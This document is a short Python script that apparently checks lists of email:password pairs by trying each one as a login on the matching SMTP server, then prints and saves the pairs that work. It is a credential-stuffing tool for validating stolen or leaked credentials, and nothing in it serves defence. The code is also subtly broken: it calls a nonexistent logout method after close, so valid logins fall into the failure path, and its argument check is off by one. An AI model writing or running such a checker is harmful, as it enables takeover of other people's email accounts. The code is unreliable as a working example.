import smtplib
import json

host_json = json.load(open('smtp_hoster.json', 'r'))

def get_host_port(domain):
	host = host_json['hosters'][domain]
	port = host_json['hosterports'][host]

	return host, port

def checking(file_in, file_out):
	fo = open(file_out, 'w')
	with open(file_in, 'r') as f:
		for i in f.readlines():
			task = i.strip().split(':')
			try:
				host, port = get_host_port(task[0].split("@")[1])
			except: continue
			try:
				mail = smtplib.SMTP(host, port)
				mail.login(task[0], task[1])
				mail.close()
				mail.logout()
				fo.write(i)
				print("Live : ", i)
				continue
			except: pass
			try:
				mail = smtplib.SMTP(host, port)
				mail.ehlo()
				mail.starttls()
				mail.login(task[0], task[1])
				mail.close()
				mail.logout()
				print("Live : ", i)
				fo.write(i)
				continue
			except Exception as e:
				print("Error Ehlo:",e)
			print("Die : ", i)

	print("Done")

if __name__ == '__main__':
	from sys import argv

	if len(argv) < 2:
		print("Usage: %s mail_pass.txt result.txt" % argv[0])
		exit()

	checking(argv[1], argv[2])
